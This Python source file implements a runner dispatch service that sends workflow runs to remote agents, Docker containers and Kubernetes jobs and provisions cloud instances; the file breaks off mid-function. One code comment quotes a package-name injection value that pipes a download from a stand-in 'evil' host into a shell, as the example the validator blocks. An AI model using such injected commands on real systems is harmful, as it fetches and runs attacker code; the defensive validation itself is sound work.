"""Remote runner dispatch service.

Three execution provider paths:

* ``agent``      — outbound-WS daemon on a VM/EC2 instance. The runner
  connects to ``/ws/runners/{runner_id}`` and accepts ``run_assigned``
  messages. Envs are built on the remote machine via ``uv`` and cached
  between runs by ``(env_id, packages_hash)``.

* ``docker``     — API drives containers via the Docker SDK. An image is
  built per-env (tagged ``noodle-env:{env_id}-{packages_hash}``) and each
  run spawns ``docker run --rm -i`` with stdin/stdout piped to the
  ``noodle_runtime`` JSON protocol.

* ``kubernetes`` — API creates a K8s Job whose pod connects back via the
  same WS agent protocol. Used for cloud-native deployments.

Run queueing: when no runner has capacity, the run row is set to
``status="queued"`` and a background ``queue_dispatch_loop`` retries
periodically or when a runner becomes available.

Cloud provisioning: when the pool's ``provider_config`` includes
``cloud_provider="aws"`` (and credentials), the queue loop will
auto-provision EC2 instances when the queue grows and idle-terminate them
after ``idle_terminate_seconds``.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from typing import Any

from sqlalchemy import select

from app.config import settings
from app.db import SessionLocal
from app.models import Run, Runner, RunnerPool, RunQueueEntry
from noodle.serialization import serialize_value

logger = logging.getLogger(__name__)

EventCallback = Callable[[dict], Awaitable[None]]

# How long to wait for a queued run before failing it.
_QUEUE_TTL_SECONDS = 3600


# RD-2: ``_ensure_docker_image`` interpolates the env's package list and Python
# version straight into a shell ``RUN uv pip install`` / ``FROM python:`` line in
# the generated Dockerfile. Shell metacharacters in a package name (e.g.
# ``"foo; curl evil | sh"``) would otherwise execute at build time. The env is
# admin-controlled (``environment:write``), but we validate as defence-in-depth.
# Each requirement is restricted to a PEP 508 name + optional extras + optional
# version specifiers using only characters that cannot break out of the shell
# word (no spaces, quotes, ``;``, ``|``, ``&``, ``$``, ``()``, backticks, …).
_PKG_SPEC_RE = re.compile(
    r"^[A-Za-z0-9][A-Za-z0-9._-]*"                      # distribution name
    r"(\[[A-Za-z0-9._,-]+\])?"                          # optional extras
    r"((===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+"         # first version specifier
    r"(,(===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+)*)?$"   # further specifiers
)
_PY_VERSION_RE = re.compile(r"^[0-9]+(\.[0-9]+){0,2}$")


def _validate_packages(packages: list[str]) -> list[str]:
    """Return the validated package specifiers or raise ``ValueError`` (RD-2)."""
    safe: list[str] = []
    for raw in packages:
        spec = str(raw).strip()
        if not spec:
            continue
        if not _PKG_SPEC_RE.match(spec):
            raise ValueError(
                f"invalid package specifier {spec!r}: only PEP 508 name/extras/"
                "version specifiers are allowed (no shell metacharacters)"
            )
        safe.append(spec)
    return safe


def _validate_python_version(version: str) -> str:
    """Return a validated ``X[.Y[.Z]]`` Python version or raise ``ValueError`` (RD-2)."""
    v = str(version or "").strip()
    if not _PY_VERSION_RE.match(v):
        raise ValueError(f"invalid python_version {version!r}: expected e.g. '3.12'")
    return v


# ---------------------------------------------------------------------------
# Agent connection state
# ---------------------------------------------------------------------------

@dataclass
class _AgentConnection:
    runner_id: str
    ws: Any  # starlette WebSocket
    active_runs: dict[str, asyncio.Future] = field(default_factory=dict)
    _send_lock: asyncio.Lock | None = field(default=None, init=False)

    @property
    def send_lock(self) -> asyncio.Lock:
        if self._send_lock is None:
            self._send_lock = asyncio.Lock()
        return self._send_lock

    async def send(self, msg: dict) -> None:
        async with self.send_lock:
            try:
                await self.ws.send_text(json.dumps(msg))
            except Exception:  # noqa: BLE001
                pass


# ---------------------------------------------------------------------------
# Main dispatcher
# ---------------------------------------------------------------------------

class RemoteDispatcher:
    def __init__(self) -> None:
        self._agents: dict[str, _AgentConnection] = {}
        # run_id → on_event callback; set during assign_run, cleared on finish
        self._run_callbacks: dict[str, EventCallback] = {}
        self._queue_loop_task: asyncio.Task | None = None
        # Lazily initialized lock — created on first async access so it binds
        # to the running event loop, not the module-import-time loop.
        self._lock_: asyncio.Lock | None = None
        # K8s single-run agents: run_id → future (resolved on run_finished)
        self._k8s_futures: dict[str, asyncio.Future] = {}
        # K8s single-run agents: run_id → run_assigned payload to deliver on connect
        self._k8s_payloads: dict[str, dict] = {}

    @property
    def _lock(self) -> asyncio.Lock:
        if self._lock_ is None:
            self._lock_ = asyncio.Lock()
        return self._lock_

    def _reset_loop_state(self) -> None:
        """Drop any asyncio objects bound to a now-gone event loop.

        Called at the start of ``queue_dispatch_loop`` so each lifespan
        (including the test-client lifespan) gets fresh primitives on the
        correct loop.
        """
        self._lock_ = None

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def assign_run(
        self,
        run_id: str,
        pool_id: str,
        env_payload: dict,
        graph: dict,
        cache: dict | None,
        targets: list[str] | None,
        workflow_modules: list[dict],
        on_event: EventCallback,
        pause_on_approval: bool = False,
        agent_action_resume: dict | None = None,
    ) -> str:
        """Dispatch a run to the pool. Returns the final run status string."""
        async with SessionLocal() as session:
            pool = await session.get(RunnerPool, pool_id)
            if pool is None:
                raise ValueError(f"runner pool '{pool_id}' not found")
            provider = pool.provider

        if provider == "agent":
            return await self._assign_agent_run(
                run_id,
                pool_id,
                env_payload,
                graph,
                cache,
                targets,
                workflow_modules,
                on_event,
                pause_on_approval=pause_on_approval,
                agent_action_resume=agent_action_resume,
            )
        if provider == "docker":
            return await self._assign_docker_run(
                run_id,
                pool_id,
                env_payload,
                graph,
                cache,
                targets,
                workflow_modules,
                on_event,
                pause_on_approval=pause_on_approval,
                agent_action_resume=agent_action_resume,
            )
        if provider == "kubernetes":
            return await self._assign_k8s_run(
                run_id,
                pool_id,
                env_payload,
                graph,
                cache,
                targets,
                workflow_modules,
                on_event,
                pause_on_approval=pause_on_approval,
                agent_action_resume=agent_action_resume,
            )
        raise ValueError(f"unknown runner pool provider '{provider}'")

    async def handle_runner_connect(self, runner_id: str, ws: Any) -> None:
        """Called by the WS route when an agent runner connects.

        Runs the receive loop until the WebSocket closes.
        """
        conn = _AgentConnection(runner_id=runner_id, ws=ws)
        async with self._lock:
            self._agents[runner_id] = conn

        logger.info("runner connected runner_id=%s", runner_id)
        async with SessionLocal() as session:
            runner = await session.get(Runner, runner_id)
            if runner is not None:
                runner.status = "online"
                runner.last_seen_at = datetime.now(UTC)
                await session.commit()

        try:
            async for raw in ws.iter_text():
                try:
                    msg = json.loads(raw)
                except json.JSONDecodeError:
                    continue
                await self._handle_agent_message(conn, msg)
        except Exception:  # noqa: BLE001 - any disconnect / protocol error
            pass
        finally:
            await self.handle_runner_disconnect(runner_id)

    async def handle_runner_disconnect(self, runner_id: str) -> None:
        async with self._lock:
            conn = self._agents.pop(runner_id, None)

        logger.info("runner disconnected runner_id=%s", runner_id)
        async with SessionLocal() as session:
            runner = await session.get(Runner, runner_id)
            if runner is not None:
                runner.status = "offline"
                await session.commit()

        if conn is None:
            return

        # Fail all in-flight runs on this connection.
        for run_id, future in list(conn.active_runs.items()):
            if not future.done():
                future.set_exception(
                    RuntimeError("runner disconnected mid-run")
                )
            cb = self._run_callbacks.pop(run_id, None)
            if cb is not None:
                try:
                    await cb({
                        "type": "run_error",
                        "run_id": run_id,
                        "error": "runner disconnected",
                    })
                except Exception:  # noqa: BLE001
                    pass

    async def cancel_remote_run(self, run_id: str, runner_id: str) -> None:
        async with self._lock:
            conn = self._agents.get(runner_id)
        if conn is not None:
            await conn.send({"type": "run_cancel", "run_id": run_id})

    async def queue_run(self, run_id: str) -> None:
        """Mark a run as queued in the DB."""
        async with SessionLocal() as session:
            run = await session.get(Run, run_id)
            if run is not None:
                run.status = "queued"
                await session.commit()

    def signal_capacity(self) -> None:
        """No-op placeholder; the queue loop polls on a fixed interval."""

    async def shutdown(self) -> None:
        for conn in list(self._agents.values()):
            try:
                await conn.ws.close()
            except Exception:  # noqa: BLE001
                pass
        self._agents.clear()

    # ------------------------------------------------------------------
    # Heartbeat + offline reaper
    # ------------------------------------------------------------------

    async def ping_connected_agents(self) -> int:
        """Send a ``ping`` to every connected agent. Returns the count sent.

        Agents reply ``pong`` which the message handler turns into a
        ``last_seen_at`` write. Failures are tolerated — the ws will surface
        the disconnect on its own iteration.
        """
        async with self._lock:
            conns = list(self._agents.values())
        sent = 0
        for conn in conns:
            try:
                await conn.send({"type": "ping"})
                sent += 1
            except Exception:  # noqa: BLE001
                pass
        return sent

    async def mark_stale_runners_offline(
        self, *, offline_after_seconds: int
    ) -> list[str]:
        """Find runners whose ``last_seen_at`` is older than the threshold,
        mark them offline, and requeue their in-flight runs.

        Returns the runner ids that were marked offline. Idempotent — runners
        already offline are skipped, and runs whose queue entry is already in
        a terminal state are left alone.
        """
        threshold = datetime.now(UTC) - timedelta(seconds=offline_after_seconds)
        marked: list[str] = []
        async with SessionLocal() as session:
            stale = (
                await session.scalars(
                    select(Runner).where(
                        Runner.status == "online",
                        Runner.last_seen_at.is_not(None),
                        Runner.last_seen_at < threshold,
                    )
                )
            ).all()
            if not stale:
                # Also handle the boundary case: status=online but last_seen_at
                # is NULL (never sent a hello). Treat them as offline so a
                # zombie row never permanently blocks dispatch.
                never_seen = (
                    await session.scalars(
                        select(Runner).where(
                            Runner.status == "online",
                            Runner.last_seen_at.is_(None),
                        )
                    )
                ).all()
                stale = never_seen
            for runner in stale:
                runner.status = "offline"
                runner.current_runs = 0
                marked.append(runner.id)
                # Drop the in-memory connection (if any) so the next assign
                # call doesn't try to route to a dead socket.
                async with self._lock:
                    self._agents.pop(runner.id, None)
                # Requeue any non-terminal runs assigned to this runner so
                # another runner in the pool can pick them up. The queue
                # service is the source of truth — clear the lease and reset
                # the entry to ``queued``.
                runs = (
                    await session.scalars(
                        select(Run).where(
                            Run.runner_id == runner.id,
                            Run.status.in_(("running", "queued", "pending")),
                        )
                    )
                ).all()
                for run in runs:
                    entry = await session.scalar(
                        select(RunQueueEntry).where(RunQueueEntry.run_id == run.id)
                    )
                    if entry is None:
                        continue
                    if entry.status in ("completed", "failed", "dead_lettered", "cancelled"):
                        continue
                    entry.status = "queued"
                    entry.leased_by = None
                    entry.lease_expires_at = None
                    entry.available_at = datetime.now(UTC)
                    entry.queue_reason = "runner_offline"
                    log = list(entry.attempts_log or [])
                    log.append({
                        "attempt": entry.attempts,
                        "event": "runner_offline",
                        "error": f"runner {runner.id} went offline",
                        "ts": datetime.now(UTC).isoformat(),
                    })
                    entry.attempts_log = log
                    run.status = "pending"
                    run.runner_id = None
            await session.commit()
        if marked:
            logger.warning(
                "marked %d runner(s) offline (no heartbeat in %ss): %s",
                len(marked), offline_after_seconds, marked,
            )
        return marked

    # ------------------------------------------------------------------
    # Agent provider
    # ------------------------------------------------------------------

    async def _assign_agent_run(
        self,
        run_id: str,
        pool_id: str,
        env_payload: dict,
        graph: dict,
        cache: dict | None,
        targets: list[str] | None,
        workflow_modules: list[dict],
        on_event: EventCallback,
        pause_on_approval: bool = False,
        agent_action_resume: dict | None = None,
    ) -> str:
        conn = await self._pick_agent(pool_id)
        if conn is None:
            await self.queue_run(run_id)
            # Provision cloud instances if configured
            await self._maybe_provision(pool_id)
            raise _QueuedError(f"run {run_id} queued — no available runners in pool {pool_id}")

        future: asyncio.Future[str] = asyncio.get_running_loop().create_future()
        conn.active_runs[run_id] = future
        self._run_callbacks[run_id] = on_event

        # Update runner current_runs and persist the runner id on the run so
        # cancel_run can route a run_cancel to this agent.
        async with SessionLocal() as session:
            runner = await session.get(Runner, conn.runner_id)
            if runner is not None:
                runner.current_runs = max(0, runner.current_runs) + 1
                runner.status = "busy"
            run = await session.get(Run, run_id)
            if run is not None:
                run.runner_id = conn.runner_id
            await session.commit()

        await conn.send({
            "type": "run_assigned",
            "run_id": run_id,
            "env": env_payload,
            "graph": graph,
            "cache": cache or {},
            "targets": targets or [],
            "workflow_modules": workflow_modules,
            "pause_on_approval": pause_on_approval,
            "agent_action_resume": agent_action_resume or {},
        })

        try:
            status = await asyncio.wait_for(future, timeout=_QUEUE_TTL_SECONDS)
        except TimeoutError:
            conn.active_runs.pop(run_id, None)
            self._run_callbacks.pop(run_id, None)
            status = "error"
        finally:
            async with SessionLocal() as session:
                runner = await session.get(Runner, conn.runner_id)
                if runner is not None:
                    runner.current_runs = max(0, runner.current_runs - 1)
                    if runner.current_runs == 0:
                        runner.status = "online"
                    await session.commit()
            self.signal_capacity()

        return status

    async def _pick_agent(self, pool_id: str) -> _AgentConnection | None:
        """Return the least-loaded available agent connection in this pool.

        Enforces two ceilings before handing out a runner:

        * **Pool-level**: the sum of ``current_runs`` across the pool's runners
          must stay below ``pool.max_concurrent_runs``. This was previously
          stored but never honoured, so a single pool could be oversubscribed.
        * **Runner-level**: each runner's ``current_runs`` must stay below its
          own ``max_concurrent_runs``.

        Among eligible *connected* agents we pick the one with the most free
        capacity (least-loaded) so traffic spreads evenly instead of always
        landing on the first registered runner.
        """
        async with SessionLocal() as session:
            pool = await session.get(RunnerPool, pool_id)
            pool_cap = pool.max_concurrent_runs if pool is not None else 0
            runners = (
                await session.scalars(
                    select(Runner).where(
                        Runner.pool_id == pool_id,
                        Runner.status.in_(["online", "busy"]),
                    )
                )
            ).all()
            pool_active = sum(max(0, r.current_runs) for r in runners)
            runner_max = {r.id: r.max_concurrent_runs for r in runners}
            runner_db_load = {r.id: max(0, r.current_runs) for r in runners}

        # Pool ceiling reached → queue rather than oversubscribe.
        if pool_cap and pool_active >= pool_cap:
            return None

        async with self._lock:
            best: _AgentConnection | None = None
            best_free = 0
            for runner_id, conn in self._agents.items():
                cap = runner_max.get(runner_id)
                if cap is None:
                    continue  # connected agent not (yet) a known runner row
                # Use whichever load count is higher so a just-assigned run that
                # hasn't been flushed to the DB row still counts against the cap.
                live_load = max(runner_db_load.get(runner_id, 0), len(conn.active_runs))
                effective_free = cap - live_load
                if effective_free > best_free:
                    best_free = effective_free
                    best = conn
            return best

    async def _handle_agent_message(self, conn: _AgentConnection, msg: dict) -> None:
        mtype = msg.get("type")
        run_id = msg.get("run_id")

        if mtype == "runner_hello":
            async with SessionLocal() as session:
                runner = await session.get(Runner, conn.runner_id)
                if runner is not None:
                    caps = msg.get("capabilities") or {}
                    runner.capabilities = caps
                    if "max_concurrent" in caps:
                        runner.max_concurrent_runs = int(caps["max_concurrent"])
                    cached = msg.get("cached_env_ids") or []
                    runner.cached_env_ids = list(cached)
                    runner.last_seen_at = datetime.now(UTC)
                    await session.commit()

        elif mtype == "env_building":
            # Scope to runs THIS connection owns so one runner can't inject
            # events into another runner's stream (RD-1).
            if run_id and run_id in conn.active_runs:
                cb = self._run_callbacks.get(run_id)
                if cb:
                    await cb({"type": "env_building", "run_id": run_id,
                              "env_id": msg.get("env_id")})

        elif mtype == "env_ready":
            env_id = msg.get("env_id")
            packages_hash = msg.get("packages_hash", "")
            if env_id and packages_hash:
                cache_key = f"{env_id}-{packages_hash}"
                async with SessionLocal() as session:
                    runner = await session.get(Runner, conn.runner_id)
                    if runner is not None:
                        existing = list(runner.cached_env_ids)
                        if cache_key not in existing:
                            existing.append(cache_key)
                            runner.cached_env_ids = existing
                        runner.last_seen_at = datetime.now(UTC)
                        await session.commit()

        elif mtype == "env_error":
            if run_id:
                fut = conn.active_runs.pop(run_id, None)
                if fut and not fut.done():
                    fut.set_exception(
                        RuntimeError(f"env build failed: {msg.get('error', 'unknown')}")
                    )
                self._run_callbacks.pop(run_id, None)

        elif mtype == "run_event":
            # Only deliver events for a run THIS connection owns — a runner must
            # not be able to push events into another runner's run stream (RD-1).
            if run_id and run_id in conn.active_runs:
                event = msg.get("event") or {}
                cb = self._run_callbacks.get(run_id)
                if cb:
                    await cb(event)

        elif mtype == "run_finished":
            if run_id:
                status = str(msg.get("status") or "error")
                fut = conn.active_runs.pop(run_id, None)
                if fut and not fut.done():
                    fut.set_result(status)
                self._run_callbacks.pop(run_id, None)

        elif mtype == "call_workflow":
            # The runner's runtime hit an execute_workflow node; resolve the
            # sub-workflow host-side and send the result back. Run it on a task
            # so the agent receive loop keeps draining.
            asyncio.create_task(self._resolve_remote_subworkflow(conn, msg))

        elif mtype == "pong":
            async with SessionLocal() as session:
                runner = await session.get(Runner, conn.runner_id)
                if runner is not None:
                    runner.last_seen_at = datetime.now(UTC)
                    await session.commit()

    async def _resolve_remote_subworkflow(
        self, conn: _AgentConnection, msg: dict
    ) -> None:
        """Run a sub-workflow host-side for a remote runner and reply.

        Reuses the host's ``_call_sub_workflow`` (deferred import to avoid the
        runner.py ↔ remote_dispatch.py cycle). With no ``parent_env_id`` it
        always returns a concrete leaf result — never an inline sentinel — so
        the value serializes cleanly back over the WS.
        """
        from app.services.runner import _call_sub_workflow  # noqa: PLC0415

        callback_id = msg.get("callback_id", "")
        try:
            _timeout = settings.subworkflow_spawn_timeout_seconds or None
            coro = _call_sub_workflow(
                str(msg.get("workflow_id") or ""), msg.get("input")
            )
            result = await (
                asyncio.wait_for(coro, timeout=_timeout) if _timeout else coro
            )
            await conn.send({
                "type": "call_workflow_response",
                "callback_id": callback_id,
                "result": serialize_value(result),
            })
        except Exception as exc:  # noqa: BLE001 - surface back to the runner
            await conn.send({
                "type": "call_workflow_error",
                "callback_id": callback_id,
                "error": f"{type(exc).__name__}: {exc}",
            })

    # ------------------------------------------------------------------
    # Docker provider
    # ------------------------------------------------------------------

    async def _assign_docker_run(
        self,
        run_id: str,
        pool_id: str,
        env_payload: dict,
        graph: dict,
        cache: dict | None,
        targets: list[str] | None,
        workflow_modules: list[dict],
        on_event: EventCallback,
        pause_on_approval: bool = False,
        agent_action_resume: dict | None = None,
    ) -> str:
        try:
            import docker  # type: ignore[import-untyped]  # noqa: PLC0415
        except ImportError as exc:
            raise RuntimeError(
                "Docker provider requires the 'docker' package: pip install docker"
            ) from exc

        async with SessionLocal() as session:
            pool = await session.get(RunnerPool, pool_id)
            cfg = pool.provider_config if pool else {}

        docker_host = cfg.get("docker_host")
        client = (
            docker.from_env()
            if not docker_host
            else docker.DockerClient(base_url=docker_host)
        )

        image_tag = (
            f"noodle-env:{env_payload.get('id', 'default')}"
            f"-{env_payload.get('packages_hash', 'latest')}"
        )
        network = cfg.get("network", "bridge")

        loop = asyncio.get_running_loop()
        # Ensure image exists (build if not) — runs in a thread executor.
        await loop.run_in_executor(
            None, self._ensure_docker_image, client, image_tag, env_payload
        )

        container_name = f"noodle-run-{run_id[:12]}"
        run_msg = json.dumps({
            "type": "run",
            "request_id": run_id,
            "graph": graph,
            "cache": cache or {},
            "targets": targets or [],
            "workflow_modules": workflow_modules,
            "pause_on_approval": pause_on_approval,
            "agent_action_resume": agent_action_resume or {},
        }) + "\n"

        node_events: dict[str, dict] = {}
        status = "error"

        try:
            container = await loop.run_in_executor(
                None,
                lambda: client.containers.run(
                    image_tag,
                    detach=True,
                    stdin_open=True,
                    remove=False,
                    name=container_name,
                    network=network,
                ),
            )

            # Attach to the container and drive the noodle_runtime protocol.
            sock = await loop.run_in_executor(None, lambda: container.attach_socket(
                params={"stdin": True, "stdout": True, "stderr": False, "stream": True}
            ))

            # Write the run message to stdin.
            await loop.run_in_executor(None, sock._sock.sendall, run_msg.encode())

            # Bound the recv loop so a crashed container never hangs the caller.
            _recv_timeout = settings.workflow_run_timeout_seconds or 3600.0
            await loop.run_in_executor(
                None, sock._sock.settimeout, _recv_timeout
            )

            # Read events line by line until result.
            buf = b""
            while True:
                chunk = await loop.run_in_executor(None, sock._sock.recv, 4096)
                if not chunk:
                    break
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        event = json.loads(line)
                    except json.JSONDecodeError:
                        continue

                    etype = event.get("type")
                    if etype == "ready":
                        # Send the run message now that the runtime is ready.
                        await loop.run_in_executor(None, sock._sock.sendall, run_msg.encode())
                    elif etype in (
                        "node_started",
                        "node_finished",
                        "agent_action_requested",
                        "agent_tool_started",
                        "agent_tool_approval_required",
                        "agent_tool_auto_approved",
                        "agent_tool_finished",
                        "agent_action_completed",
                        "agent_tool_approval_decided",
                        "run_error",
                        "run_cancelled",
                        "module_error",
                    ):
                        await on_event(event)
                        if etype == "node_finished":
                            nid = event.get("node_id")
                            if nid:
                                node_events[nid] = event
                    elif etype == "result":
                        status = str(event.get("status", "error"))
                        break
                else:
                    continue
                break

        except Exception as exc:  # noqa: BLE001
            logger.exception("docker run failed run_id=%s: %s", run_id, exc)
            await on_event({"type": "run_error", "error": str(exc)})
            status = "error"
        finally:
            try:
                await loop.run_in_executor(
                    None,
                    lambda: client.containers.get(container_name).remove(force=True),
                )
            except Exception:  # noqa: BLE001
                pass

        return status

    def _ensure_docker_image(self, client: Any, image_tag: str, env_payload: dict) -> None:
        """Build a Docker image for this env if it doesn't exist. Sync — runs in executor."""
        try:
            client.images.get(image_tag)
            return  # Cache hit
        except Exception:  # noqa: BLE001
            pass  # Image not found, build it

        python_version = _validate_python_version(env_payload.get("python_version", "3.12"))
        packages = _validate_packages(env_payload.get("packages") or [])
        packages_str = " ".join(packages) if packages else ""
        install_line = (
            f"RUN uv pip install --system noodle-runtime noodle-nodes noodle-core {packages_str}"
            if packages_str
            else "RUN uv pip install --system noodle-runtime noodle-nodes noodle-core"
        )

        dockerfile = (
            f"FROM python:{python_version}-slim\n"
            "RUN pip install uv --quiet\n"
            f"{install_line}\n"
            'ENTRYPOINT ["python", "-u", "-m", "noodle_runtime"]\n'
        )

        import io  # noqa: PLC0415
        client.images.build(
            fileobj=io.BytesIO(dockerfile.encode()),
            tag=image_tag,
            rm=True,
        )
        logger.info("built docker image %s", image_tag)

    # ------------------------------------------------------------------
    # Kubernetes provider
    # ------------------------------------------------------------------

    async def _assign_k8s_run(
        self,
        run_id: str,
        pool_id: str,
        env_payload: dict,
        graph: dict,
        cache: dict | None,
        targets: list[str] | None,
        workflow_modules: list[dict],
        on_event: EventCallback,
        pause_on_approval: bool = False,
        agent_action_resume: dict | None = None,
    ) -> str:
        """Create a K8s Job whose pod connects back as a single-run agent."""
        try:
            from kubernetes_asyncio import (
                client as k8s_client,  # type: ignore[import-untyped]  # noqa: PLC0415
            )
            from kubernetes_asyncio import (
                config as k8s_config,  # type: ignore[import-untyped]  # noqa: PLC0415
            )
        except ImportError as exc:
            raise RuntimeError(
                "Kubernetes provider requires 'kubernetes-asyncio': pip install kubernetes-asyncio"
            ) from exc

        async with SessionLocal() as session:
            pool = await session.get(RunnerPool, pool_id)
            cfg = pool.provider_config if pool else {}

        kubeconfig_yaml = cfg.get("kubeconfig_yaml")
        namespace = cfg.get("namespace", "noodle")
        image_registry = cfg.get("image_registry", "")
        node_selector = cfg.get("node_selector") or {}

        image_tag = (
            f"noodle-env:{env_payload.get('id', 'default')}"
            f"-{env_payload.get('packages_hash', 'latest')}"
        )
        full_image = f"{image_registry}/{image_tag}" if image_registry else image_tag

        # Generate a one-time run token for this pod.
        from app.services.crypto import create_payload_token  # noqa: PLC0415
        token = create_payload_token({"sub": run_id, "kind": "k8s_run"}, ttl_seconds=3600)

        from app.config import settings as app_settings  # noqa: PLC0415
        api_url = getattr(app_settings, "public_api_url", "http://noodle-api:8000")

        # Load kubeconfig.
        if kubeconfig_yaml:
            import os  # noqa: PLC0415
            import tempfile  # noqa: PLC0415
            with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
                f.write(kubeconfig_yaml)
                kube_path = f.name
            await k8s_config.load_kube_config(config_file=kube_path)
            os.unlink(kube_path)
        else:
            await k8s_config.load_incluster_config()

        batch_v1 = k8s_client.BatchV1Api()
        job_name = f"noodle-run-{run_id[:16]}"

        job_body = k8s_client.V1Job(
            metadata=k8s_client.V1ObjectMeta(name=job_name, namespace=namespace),
            spec=k8s_client.V1JobSpec(
                ttl_seconds_after_finished=300,
                template=k8s_client.V1PodTemplateSpec(
                    spec=k8s_client.V1PodSpec(
                        restart_policy="Never",
                        node_selector=node_selector or None,
                        containers=[
                            k8s_client.V1Container(
                                name="runner",
                                image=full_image,
                                command=[
                                    "python", "-u", "-m",
                                    "noodle_runner_agent.k8s_entrypoint",
                                ],
                                env=[
                                    k8s_client.V1EnvVar(name="NOODLE_API_URL", value=api_url),
                                    k8s_client.V1EnvVar(name="NOODLE_RUN_TOKEN", value=token),
                                    k8s_client.V1EnvVar(name="NOODLE_RUN_ID", value=run_id),
                                ],
                            )
                        ],
                    )
                ),
            ),
        )

        # Register a future that will be resolved when the pod connects back.
        future: asyncio.Future[str] = asyncio.get_running_loop().create_future()
        # Use run_id as runner_id for K8s single-run agents.
        self._run_callbacks[run_id] = on_event
        self._k8s_futures[run_id] = future
        # The pod fetches its run payload over the WS once it connects.
        self._k8s_payloads[run_id] = {
            "type": "run_assigned",
            "run_id": run_id,
            "env": env_payload,
            "graph": graph,
            "cache": cache or {},
            "targets": targets or [],
            "workflow_modules": workflow_modules,
            "pause_on_approval": pause_on_approval,
            "agent_action_resume": agent_action_resume or {},
        }

        try:
            await batch_v1.create_namespaced_job(namespace=namespace, body=job_body)
            logger.info("created k8s job %s for run %s", job_name, run_id)
            status = await asyncio.wait_for(future, timeout=_QUEUE_TTL_SECONDS)
        except TimeoutError:
            status = "error"
        except Exception as exc:  # noqa: BLE001
            logger.exception("k8s job creation failed run_id=%s: %s", run_id, exc)
            status = "error"
        finally:
            self._k8s_futures.pop(run_id, None)
            self._k8s_payloads.pop(run_id, None)
            self._run_callbacks.pop(run_id, None)
            # Clean up job
            try:
                await batch_v1.delete_namespaced_job(
                    name=job_name, namespace=namespace,
                    body=k8s_client.V1DeleteOptions(propagation_policy="Background"),
                )
            except Exception:  # noqa: BLE001
                pass

        return status

    async def handle_k8s_runner_connect(self, run_id: str, ws: Any) -> None:
        """Called when a K8s pod connects back as a single-run agent."""
        conn = _AgentConnection(runner_id=run_id, ws=ws)
        async with self._lock:
            self._agents[run_id] = conn

        try:
            async for raw in ws.iter_text():
                try:
                    msg = json.loads(raw)
                except json.JSONDecodeError:
                    continue

                mtype = msg.get("type")
                if mtype == "runner_hello":
                    # Deliver the pre-queued run assignment to the pod.
                    payload = self._k8s_payloads.get(run_id)
                    if payload is not None:
                        await conn.send(payload)
                elif mtype == "run_event":
                    # This WS is authenticated for exactly one run (run_id ==
                    # conn.runner_id). Ignore any other run_id the pod claims so
                    # a compromised pod can't touch another run's stream (RD-1).
                    rid = msg.get("run_id")
                    if rid and rid == run_id:
                        cb = self._run_callbacks.get(rid)
                        if cb:
                            await cb(msg.get("event") or {})
                elif mtype == "run_finished":
                    rid = msg.get("run_id")
                    if rid and rid == run_id:
                        fut = getattr(self, "_k8s_futures", {}).pop(rid, None)
                        if fut and not fut.done():
                            fut.set_result(str(msg.get("status") or "error"))
                        self._run_callbacks.pop(rid, None)
        except Exception:  # noqa: BLE001
            pass
        finally:
            async with self._lock:
                self._agents.pop(run_id, None)

    # ------------------------------------------------------------------
    # Cloud provisioning (AWS / GCP / Azure)
    # ------------------------------------------------------------------

    async def _maybe_provision(self, pool_id: str) -> None:
        """Provision a new cloud instance if the pool config supports it."""
        async with SessionLocal() as session:
            pool = await session.get(RunnerPool, pool_id)
            if pool is None:
                return
            cfg = pool.provider_config
            provider = cfg.get("cloud_provider")
            if provider not in ("aws", "gcp", "azure"):
                return
            max_instances = int(cfg.get("max_instances", 0))
            if max_instances <= 0:
                return
            existing = (await session.scalars(
                select(Runner).where(Runner.pool_id == pool_id)
            )).all()

        if len(existing) >= max_instances:
            return

        if provider == "aws":
            await self._provision_aws_instance(pool_id, cfg)
        elif provider == "gcp":
            await self._provision_gcp_instance(pool_id, cfg)
        elif provider == "azure":
            await self._provision_azure_instance(pool_id, cfg)

    def _bootstrap_user_data(self, api_url: str, token: str, runner_id: str) -> str:
        """Cloud-init / startup script that installs and starts the agent.

        Security note: the runner token is embedded in the instance user-data
        script. User-data is accessible from within the instance via the
        metadata service (169.254.169.254). For higher-security deployments,
        rotate runner tokens regularly or use AWS Systems Manager Parameter
        Store / IAM instance roles instead of passing the token inline.
        """
        logger.warning(
            "provisioning cloud runner %s: token written to instance user-data; "
            "rotate this runner's token after use for production deployments",
            runner_id,
        )
        return (
            "#!/bin/bash\n"
            "set -e\n"
            "pip install noodle-runner --quiet\n"
            f"noodle-runner register --api-url {api_url} --token {token} "
            f"--name cloud-{runner_id[:8]}\n"
            "noodle-runner start &\n"
        )

    async def _provision_aws_instance(self, pool_id: str, cfg: dict) -> None:
        """Provision an EC2 instance and register a runner for it."""
        try:
            import boto3  # type: ignore[import-untyped]  # noqa: PLC0415
        except ImportError:
            logger.warning("boto3 not installed — cannot auto-provision EC2 runners")
            return

        from app.config import settings as app_settings  # noqa: PLC0415
        api_url = getattr(app_settings, "public_api_url", "http://localhost:8000")
        region = cfg.get("region", "us-east-1")
        instance_type = cfg.get("instance_type", "t3.medium")
        ami_id = cfg.get("ami_id", "")
        key_pair = cfg.get("key_pair", "")
        security_groups = cfg.get("security_group_ids") or []
        aws_key = cfg.get("aws_access_key_id", "")
        aws_secret = cfg.get("aws_secret_access_key", "")

        if not ami_id:
            logger.warning("cloud provisioning skipped — no ami_id in pool config")
            return

        runner_id, token = await self._create_runner_and_token(pool_id, "cloud-auto")

        user_data = self._bootstrap_user_data(api_url, token, runner_id)

        import base64  # noqa: PLC0415
        encoded_ud = base64.b64encode(user_data.encode()).decode()

        ec2_kwargs: dict = {"region_name": region}
        if aws_key and aws_secret:
            ec2_kwargs["aws_access_key_id"] = aws_key
            ec2_kwargs["aws_secret_access_key"] = aws_secret

        run_kwargs: dict = {
            "ImageId": ami_id,
            "InstanceType": instance_type,
            "MinCount": 1,
            "MaxCount": 1,
            "UserData": encoded_ud,
        }
        if key_pair:
            run_kwargs["KeyName"] = key_pair
        if security_groups:
            run_kwargs["SecurityGroupIds"] = security_groups

